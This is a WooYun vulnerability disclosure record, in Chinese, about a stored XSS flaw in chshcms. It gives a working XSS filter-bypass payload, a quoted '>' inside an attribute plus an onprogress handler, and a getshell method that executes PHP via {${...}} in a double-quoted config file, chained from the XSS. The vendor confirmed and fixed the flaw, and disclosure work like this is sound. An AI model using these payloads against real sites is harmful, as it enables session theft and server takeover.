{"id": 53349, "wybug_id": "wooyun-2014-067967", "wybug_title": "程氏舞曲CMS储存型 xss（6） 附后台getshell", "wybug_corp": "chshcms.com", "wybug_author": "roker", "wybug_date": "2014-07-18 11:09", "wybug_open_date": "2014-10-16 11:10", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向公众公开  简要描述： 大概这是最后一次 提交这个cms的xss了。。 详细说明：  黑盒几分钟就出来了。。发表文章处。先提交一段测试代码。\n<img src=x/onerror=x>onerror onxxxx<img src=x onxxxx=><x xx onxxxx=x>\n发现 结果只剩下了 onxxxx。那么 其机制大概是这样的。\n先过滤掉 onerror之类的危险字符串。再将 <>标签内的onxxx给过滤掉\n上次我是这样绕过的 WooYun: 程氏舞曲储存型xss (4) #2处xss 如果我换成 ' 包裹住 > 会怎样呢？提交 <img src=x ='>' onxxxx=>。 这下没过滤了。剩下的就是找个没有在白名单里的 事件了。 像这样 alert\n<video src=\"xxx.xxx.xxx/a\"a='>' onprogress=alert(1)>\n\n\n（该事件测试于 谷歌浏览器）后台getshell就很简单了，看到/csdj/lib/Cs_Config.php的代码\n<?phpdefine(\"Web_Name\",\"程氏CMS3.5\"); //站点名称  define(\"Web_Url\",\"localhost\"); //站点域名  define(\"Web_Path\",\"/\"); //站点路径  define(\"Admin_Code\",\"aaaaaa\");  //后台验证码  define(\"Admin_Url\",\"\");  //后台访问域名，留空为取消   define(\"Web_Off\",0);  //网站开关  define(\"Web_Onneir\",\"网站升级中...\");  //网站关闭内容  define(\"Web_Mode\",1);  //网站运行模式  define(\"Html_Wjt\",\".htaccess\");  //伪静态模式  define(\"Html_Index\",\"index.html\");  //主.............\n双引号，所以可以通过{${phpinfo()}}这种格式直接执行php代码.\n\n\n\n触发xss后可以利用js提交数据getshell 此前已有实例 就不写js代码了   漏洞证明：  如上所述   修复方案：  加强过滤 :）   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-18 11:27 厂商回复： 经过确定，漏洞确实存在，已经修复，感谢您的检测~！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}